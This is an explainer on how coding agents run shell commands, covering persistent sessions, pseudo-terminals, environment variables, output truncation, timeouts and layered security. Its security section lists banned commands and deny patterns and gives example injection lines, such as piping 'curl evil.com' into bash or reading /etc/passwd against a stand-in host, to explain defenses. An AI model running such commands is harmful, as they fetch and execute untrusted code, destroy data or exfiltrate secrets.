---
title: "Bash and Shell Execution"
---

# Bash and Shell Execution

Shell execution patterns in coding agents — from persistent sessions to stateless subprocesses, PTY management, and security.

## 1. The Shell as Universal Tool

Nearly every coding agent exposes a bash or shell tool. This is not a coincidence — the
shell is arguably the single most powerful tool an agent can wield. It subsumes file
editing, code execution, version control, package management, network requests, process
management, and system administration into a single unified interface.

The **mini-SWE-agent** thesis makes this explicit: you do not need a dozen specialized
tools. One bash tool is sufficient. The agent can `cat` files instead of needing a read
tool, `sed` or `patch` instead of an edit tool, `find` and `grep` instead of a search
tool. This radical simplification reduces the tool-selection problem to prompt
engineering within a single tool.

```python
# mini-SWE-agent's minimal tool definition
tools = [
    {
        "name": "bash",
        "description": "Run a bash command in the terminal.",
        "parameters": {
            "command": {"type": "string", "description": "The bash command to run"}
        }
    }
]
```

The shell is also the lowest common denominator across operating systems. While the
specific shell varies (`bash` on Linux, `zsh` on macOS, `cmd`/`powershell` on Windows),
the concept of "execute a string as a system command" is universal. This makes the shell
tool the most portable agent capability.

However, the shell's power is also its greatest liability. An unrestricted shell tool
can destroy filesystems, exfiltrate data, install malware, or consume infinite resources.
Every production agent must balance the shell's universality against its danger. The
sections below explore how different agents navigate this tension.

## 2. Persistent Bash Session Management

Most production coding agents maintain a **long-running bash session** rather than
spawning a new process for each command. This architectural choice has profound
implications for state management, performance, and reliability.

### OpenCode: `GetPersistentShell()`

OpenCode creates a persistent bash process that survives across tool invocations:

```go
// Simplified from OpenCode's shell management
func GetPersistentShell() *PersistentShell {
    cmd := exec.Command("bash", "--noediting", "--noprofile", "--norc")
    cmd.Env = append(os.Environ(),
        "PS1=",           // suppress prompt
        "TERM=dumb",      // disable terminal features
        "GIT_PAGER=cat",  // prevent interactive pagers
    )
    stdin, _ := cmd.StdinPipe()
    stdout, _ := cmd.StdoutPipe()
    cmd.Start()
    return &PersistentShell{cmd: cmd, stdin: stdin, stdout: stdout}
}
```

Key design decisions:
- **`--noediting --noprofile --norc`**: Strips bash down to a minimal execution engine,
  avoiding user customizations that could interfere with agent operation.
- **`PS1=""`**: Eliminates the prompt, simplifying output parsing.
- **`TERM=dumb`**: Prevents programs from emitting terminal escape sequences.
- **Sentinel-based command boundaries**: After each command, OpenCode echoes a unique
  marker to delimit where one command's output ends and the next begins.

### Gemini CLI: Persistent Shell with State

Gemini CLI similarly maintains a persistent shell, tracking the working directory
and environment state between commands. Each command execution reads back the
shell's CWD after completion, keeping the agent's internal model synchronized
with reality.

### OpenHands: Persistent Shell Within Docker

OpenHands takes persistence further by running its shell inside a Docker container.
The container provides both persistence (the shell session survives across tool calls)
and isolation (the container's filesystem is separate from the host). This dual
benefit makes Docker-based shells popular in production deployments.

```python
# Conceptual model of OpenHands' sandboxed shell
class SandboxShell:
    def __init__(self):
        self.container = docker.create("openhands-sandbox")
        self.shell = self.container.exec("bash")

    def run(self, command: str) -> str:
        # Command executes in persistent shell inside container
        return self.shell.execute(command)
```

### Benefits of Persistent Sessions

| Benefit | Description |
|---------|-------------|
| **State accumulation** | Environment variables, shell functions, aliases persist across calls |
| **CWD persistence** | `cd` in one command affects subsequent commands naturally |
| **Performance** | No process creation overhead per command |
| **History context** | Previous commands available via history expansion |
| **Virtual env activation** | `source venv/bin/activate` persists for subsequent Python calls |

### Challenges of Persistent Sessions

- **State corruption**: A failed command can leave the shell in an unexpected state
  (e.g., a partial `cd` into a deleted directory).
- **Resource leaks**: Background processes, open file descriptors, and accumulated
  memory usage can degrade the session over time.
- **Zombie processes**: Child processes that are not properly waited on accumulate.
- **Non-determinism**: The shell's behavior depends on its history, making debugging
  difficult. Two identical commands can produce different results depending on prior state.

## 3. PTY (Pseudo-Terminal) Management

A pseudo-terminal (PTY) is a pair of virtual devices — a master and a slave — that
emulate a hardware terminal. PTY management is one of the most subtle aspects of
shell tool implementation, because programs behave fundamentally differently depending
on whether their stdout is connected to a TTY or a pipe.

### Why PTY Matters for Agents

```bash
# This command produces different output depending on TTY
ls --color=auto
# TTY:  colored output with escape sequences
# Pipe: plain text, no colors

# This command may refuse to run without a TTY
ssh user@host
# TTY:  interactive session
# Pipe: "Pseudo-terminal will not be allocated"
```

Programs detect TTY attachment via `isatty()` and change their behavior:
- **Colors and formatting**: `ls`, `grep`, `gcc` emit ANSI colors only on TTYs.
- **Progress bars**: `curl`, `pip`, `npm` show progress bars only on TTYs.
- **Interactive prompts**: `sudo`, `ssh`, `git` credential helpers require TTYs.
- **Buffering**: stdout is line-buffered on TTYs, fully buffered on pipes.
- **Output width**: Programs query terminal width (`COLUMNS`) for formatting.

### How Agents Create and Manage PTYs

Most agents use the operating system's PTY facilities:

```go
// Go: using os/exec with PTY (via creack/pty)
import "github.com/creack/pty"

func startShellWithPTY() (*os.File, error) {
    cmd := exec.Command("bash")
    ptmx, err := pty.Start(cmd)  // creates PTY pair, attaches to command
    // ptmx is the master side — agent reads/writes here
    return ptmx, err
}
```

```python
# Python: using the pty module
import pty, os

master_fd, slave_fd = pty.openpty()
pid = os.fork()
if pid == 0:  # child
    os.setsid()
    os.dup2(slave_fd, 0)  # stdin
    os.dup2(slave_fd, 1)  # stdout
    os.dup2(slave_fd, 2)  # stderr
    os.execvp("bash", ["bash"])
```

### Warp's Block-Based PTY Model

Warp, the AI-native terminal, reimagines the PTY model. Instead of treating terminal
output as a continuous stream, Warp segments it into **blocks** — each command and its
output form a discrete unit:

- **Structured input/output**: Each block has a clearly delimited command, exit code,
  and output region. This makes it trivial for an AI to understand command boundaries.
- **Terminal state tracking**: Warp maintains a semantic model of the terminal state,
  not just raw bytes. This enables AI features like command suggestions and error
  explanation that understand context.
- **Selective context**: When feeding terminal history to an AI, Warp can select
  specific blocks rather than dumping raw scrollback. This dramatically improves
  token efficiency.

### PTY Output Pipeline

Raw PTY output goes through several stages before reaching the agent:

```
Raw bytes → UTF-8 decode → ANSI escape parsing → Escape stripping → Clean text
```

The ANSI escape stripping step is critical. Without it, the agent sees noise like:
```
\033[1;32mSuccess\033[0m  →  (after stripping)  →  Success
```

## 4. Environment Variable Handling

Environment variables are a primary mechanism for configuring tool behavior, and agents
use them extensively to create a predictable execution environment.

### Common Agent Environment Variables

```yaml
# mini-SWE-agent's environment configuration
env_variables:
  PAGER: "cat"              # prevent interactive pagers
  PIP_PROGRESS_BAR: "off"   # suppress pip progress bars
  GIT_PAGER: "cat"          # prevent git from opening less
  DEBIAN_FRONTEND: "noninteractive"  # suppress apt prompts
  TERM: "dumb"              # disable terminal capabilities
  NO_COLOR: "1"             # universal color suppression
  GIT_TERMINAL_PROMPT: "0"  # prevent git credential prompts
```

These variables share a common goal: **eliminating interactivity**. An agent cannot
respond to a pager prompt or a color-coded menu. By setting these variables, agents
ensure that commands produce clean, non-interactive, parseable output.

### Propagation Strategies

| Agent | Strategy | Scope |
|-------|----------|-------|
| **mini-SWE-agent** | YAML config, injected at session start | Per-session |
| **OpenCode** | Set in persistent shell's initial environment | Persists across calls |
| **Codex** | Sandbox-scoped, inherited by all processes | Per-sandbox |
| **OpenHands** | Docker container environment | Per-container |
| **Copilot CLI** | Set per shell invocation with overrides | Per-command |

### The `PAGER=cat` Pattern

The single most common environment variable across coding agents is `PAGER=cat`.
Without it, commands like `git log`, `git diff`, and `man` open an interactive pager
(usually `less`), which blocks the agent indefinitely. Setting `PAGER=cat` forces
these commands to dump their full output to stdout, which the agent can capture.

## 5. Working Directory Tracking

The working directory is deceptively important. Every relative path in every command
depends on it. Agents that lose track of their CWD will produce wrong file references,
fail to find files, and generate incorrect patches.

### Strategies for CWD Tracking

**mini-SWE-agent: Explicit Prefix**
Because mini-SWE-agent uses stateless `subprocess.run()`, it cannot maintain CWD
across calls. Every command must be prefixed:

```python
# mini-SWE-agent's approach
def run_command(command: str, workdir: str) -> str:
    full_command = f"cd {workdir} && {command}"
    result = subprocess.run(full_command, shell=True, capture_output=True)
    return result.stdout.decode()
```

This works but is fragile — if the `cd` fails (directory deleted), the entire
command fails with a confusing error.

**Persistent Shells: Automatic Tracking**
Agents with persistent shells track CWD by reading it after each command:

```bash
# After each command, read the current directory
echo "___CWD___$(pwd)___CWD___"
```

The agent parses this sentinel-wrapped path to update its internal CWD model.

**OpenCode: Post-Command CWD Synchronization**
OpenCode reads the shell's CWD after every command execution, ensuring its internal
model stays synchronized even after commands that change directories as a side effect.

### Race Conditions

When agents support parallel tool calls, CWD tracking becomes a concurrency problem.
If two commands run simultaneously and both call `cd`, the final CWD is
non-deterministic. Production agents typically either:
1. **Serialize shell access**: Only one command runs at a time.
2. **Use absolute paths**: Eliminate CWD dependency entirely.
3. **Per-command CWD**: Each command specifies its own working directory.

## 6. Shell vs Subprocess: When to Use Which

The fundamental architectural choice is between a persistent shell and stateless
subprocess invocations. Each has clear trade-offs:

| Feature | Persistent Shell | `subprocess.run()` |
|---------|-----------------|-------------------|
| **State persistence** | Yes — env vars, CWD, functions survive | No — clean slate each time |
| **Isolation** | Low — commands share state | High — no shared state |
| **Performance** | Fast — no process creation overhead | Slow — new process per command |
| **Complexity** | High — must manage session lifecycle | Low — fire and forget |
| **Error recovery** | Hard — corrupted state persists | Easy — next call is fresh |
| **Interactive commands** | Supported via PTY | Limited — no TTY by default |
| **Resource usage** | Constant — one long-lived process | Spiky — processes created/destroyed |
| **Debugging** | Hard — behavior depends on history | Easy — reproducible in isolation |
| **Virtual environments** | Natural — activate once, use forever | Awkward — must activate per command |

### When to Use a Persistent Shell

- Agent needs to maintain environment state (activated virtualenvs, exported variables)
- Performance matters (many small commands in sequence)
- Interactive command support is required
- Commands are logically sequential and depend on shared state

### When to Use Subprocesses

- Isolation and reproducibility are priorities
- Commands are independent and parallelizable
- Error recovery must be robust
- Security requires limiting state accumulation

Most production agents use **persistent shells** because the benefits of state
persistence outweigh the complexity costs. However, some agents (like mini-SWE-agent)
deliberately choose subprocesses for simplicity.

## 7. Output Capture and Streaming

Capturing command output correctly is harder than it appears. Agents must handle
stdout/stderr separation, streaming vs buffered output, enormous outputs, binary
data, and terminal escape codes.

### stdout vs stderr

```python
# Capturing stdout and stderr separately
result = subprocess.run(cmd, capture_output=True, text=True)
stdout = result.stdout  # normal output
stderr = result.stderr  # error output

# Capturing merged (as a TTY would show)
result = subprocess.run(cmd, stdout=PIPE, stderr=STDOUT, text=True)
merged = result.stdout  # both streams interleaved
```

Most agents merge stdout and stderr, because:
1. The model needs to see error messages inline with regular output.
2. Interleaving order matters for understanding what happened.
3. Separate streams complicate the tool response format.

### Streaming vs Waiting

| Approach | Pros | Cons |
|----------|------|------|
| **Wait for completion** | Simple; complete output | Blocks until done; no progress visibility |
| **Stream in real-time** | Progressive feedback; can abort early | Complex; partial outputs in context |
| **Hybrid (timeout + background)** | Best of both; responsive | Complex state management |

The Copilot CLI uses a hybrid approach: wait for an initial period, then move the
command to the background and continue. This balances responsiveness with simplicity.

### Output Truncation Strategies

Large command outputs (e.g., `find /` or a failing test suite's full output) can
overwhelm the model's context window. Agents use various truncation strategies:

**OpenCode: Middle Truncation (30,000 char limit)**
```
[first 15,000 chars]
... [truncated N characters] ...
[last 15,000 chars]
```
Preserves both the beginning (often headers, initial output) and the end (often
the final error message or summary).

**mini-SWE-agent: Head + Tail (10,000 char limit)**
```
[first 5,000 chars]
... [content omitted — use head/tail/grep to read specific sections] ...
[last 5,000 chars]
```
Includes an instructional message teaching the model to use more targeted commands.

**ForgeCode: Explicit Truncation Signals**
ForgeCode emits structured truncation markers that the model can parse, enabling
it to request specific portions of the output.

### ANSI Escape Code Stripping

Raw terminal output contains escape sequences for colors, cursor movement, and
formatting. Agents must strip these before sending output to the model:

```python
import re

def strip_ansi(text: str) -> str:
    ansi_pattern = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')
    return ansi_pattern.sub('', text)
```

Without stripping, the model wastes tokens parsing meaningless escape sequences
and may misinterpret them as part of the actual output.

## 8. Timeout and Process Lifecycle Management

Long-running commands are inevitable — infinite loops, network timeouts, large builds.
Agents must handle these gracefully without leaving orphan processes or corrupted state.

### Graceful Shutdown Sequence

The standard pattern is escalating signals:

```
1. SIGTERM  →  "Please exit gracefully"    →  Wait 5-10 seconds
2. SIGINT   →  "Interrupt (Ctrl+C)"       →  Wait 2-5 seconds
3. SIGKILL  →  "Force terminate"           →  No wait (unblockable)
```

```go
// Go implementation of graceful shutdown
func terminateGracefully(cmd *exec.Cmd, timeout time.Duration) {
    cmd.Process.Signal(syscall.SIGTERM)
    done := make(chan error)
    go func() { done <- cmd.Wait() }()
    select {
    case <-done:
        return  // exited gracefully
    case <-time.After(timeout):
        cmd.Process.Signal(syscall.SIGKILL)  // force terminate
    }
}
```

### Process Group Management

A critical subtlety: terminating a shell process does **not** automatically terminate
its children. If the agent runs `bash -c "sleep 1000 | wc -l"` and ends bash, the
`sleep` and `wc` processes may become orphans.

The solution is **process groups**:

```go
cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
// Later, send signal to the entire group using the negative PID convention:
syscall.Signal(-cmd.Process.Pid, syscall.SIGTERM)
```

### Agent-Specific Timeout Defaults

| Agent | Default Timeout | Configurable | Termination Strategy |
|-------|----------------|--------------|----------------------|
| **Copilot CLI** | 30s initial, background after | Yes | Session termination |
| **Codex** | 120s | Yes | SIGTERM → SIGKILL |
| **OpenHands** | 120s | Yes | Container stop |
| **mini-SWE-agent** | None (waits forever) | No | Manual interrupt |
| **Goose** | 300s | Yes | Process group signal |

## 9. Interactive Command Handling

Interactive commands — those that prompt for user input — are the bane of agent shell
tools. An agent that encounters an unexpected `[Y/n]` prompt will hang indefinitely
unless it has a strategy for handling it.

### Prevention Strategies

The best approach is to prevent interactive prompts from appearing:

```bash
# Prevent package manager prompts
export DEBIAN_FRONTEND=noninteractive
apt-get install -y package_name

# Prevent pager activation
export PAGER=cat
git log  # dumps to stdout instead of opening less

# Prevent git credential prompts
export GIT_TERMINAL_PROMPT=0
git clone https://private-repo  # fails fast instead of prompting

# Pre-answer prompts
yes | rm -i *.tmp  # auto-answer "y" to all prompts
```

### Detection and Recovery

When prevention fails, agents must detect and recover from stuck commands:

1. **Timeout-based detection**: If a command produces no output for N seconds, assume
   it is waiting for input.
2. **Output pattern matching**: Watch for patterns like `[Y/n]`, `Password:`,
   `Press any key`, `(yes/no)`.
3. **Recovery actions**: Send `\n` (accept default), `q` (quit), or Ctrl+C to
   unblock the command.

### The `PAGER=cat` Ecosystem

The interactive pager problem is so pervasive that it has spawned an ecosystem of
environment variables and flags:

```bash
PAGER=cat               # generic pager override
GIT_PAGER=cat           # git-specific pager override
MANPAGER=cat            # man page pager override
BAT_PAGER=""            # bat (cat alternative) pager override
LESS=-FRX               # make less behave like cat for short output
```

## 10. Security: Preventing Shell Injection

The shell tool is simultaneously the most useful and most dangerous tool an agent
possesses. A single malicious or misguided command can compromise the entire system.
Production agents employ multiple layers of defense.

### Dangerous Command Detection

**OpenCode: Banned Commands List**
```go
var bannedCommands = []string{
    "curl", "wget",   // network exfiltration
    "nc", "netcat",   // arbitrary network connections
    "dd",             // raw disk operations
    "mkfs",           // filesystem destruction
}
```

**Goose SecurityInspector: Regex Pattern Matching**
```python
DANGEROUS_PATTERNS = [
    r"rm\s+-rf\s+/",           # recursive delete from root
    r">\s*/dev/sd[a-z]",       # overwrite block devices
    r"chmod\s+777\s+/",       # open permissions on root
    r"curl.*\|\s*bash",       # pipe-to-bash execution
    r"eval\s+.*\$",           # eval with variable expansion
]
```

**Codex: Shell Command Parser**
Codex takes a more sophisticated approach — it parses compound shell commands into
their constituent parts and evaluates each independently:

```bash
# Codex decomposes this:
echo "hello" && curl evil.com | bash

# Into:
#   1. echo "hello"       → allowed
#   2. curl evil.com      → blocked (network access)
#   3. bash (piped input) → blocked (arbitrary execution)
```

### Shell Injection Vectors

Even when the agent is not malicious, LLM hallucinations can produce dangerous
commands. Common injection vectors include:

```bash
# Command substitution — executes embedded command
echo "Date is $(dangerous_command)"

# Backtick substitution — same risk, older syntax
echo "Date is `dangerous_command`"

# Pipe to shell — downloads and executes arbitrary code
curl https://example.com/script.sh | bash

# Background execution — runs silently
malicious_command &

# Process substitution — executes in subshell
diff <(cat /etc/passwd) <(curl evil.com/passwords)
```

### Mitigation Strategies

| Strategy | Strength | Weakness |
|----------|----------|----------|
| **Command allowlists** | Simple, effective | Overly restrictive; breaks legitimate use |
| **Pattern-based blocking** | Catches known bad patterns | Bypassable with obfuscation |
| **AST-level parsing** | Understands command structure | Complex; shell grammar is irregular |
| **Sandboxing (Docker/VM)** | Strong isolation | Performance overhead; setup complexity |
| **Network isolation** | Prevents exfiltration | Breaks legitimate network commands |
| **User confirmation** | Human in the loop | Interrupts agent autonomy; approval fatigue |

### The Power-Safety Tension

The fundamental tension in shell security is that **every restriction reduces the
agent's capability**. Block `curl` and the agent cannot fetch documentation. Block
`rm` and the agent cannot clean up temporary files. Block `eval` and the agent
cannot run dynamically generated commands.

Production agents navigate this tension through layered defenses:

1. **Sandboxing** provides the outer boundary — even if the agent runs a dangerous
   command, the blast radius is contained.
2. **Command analysis** catches obvious mistakes and known-dangerous patterns.
3. **User confirmation** gates high-risk operations (when running interactively).
4. **Monitoring and logging** enables post-hoc detection and response.

The most secure agents (like Codex) combine all four layers. The most permissive
(like mini-SWE-agent running locally) rely primarily on the user's trust and the
sandboxing provided by the development environment itself.

---

## Summary

Shell execution is the foundational capability of coding agents. The design decisions
around session persistence, PTY management, environment configuration, output handling,
and security define much of an agent's character and capability. The field is converging
on persistent shells with PTY support, middle-truncation output strategies, and
layered security models — but significant variation remains as the ecosystem matures.
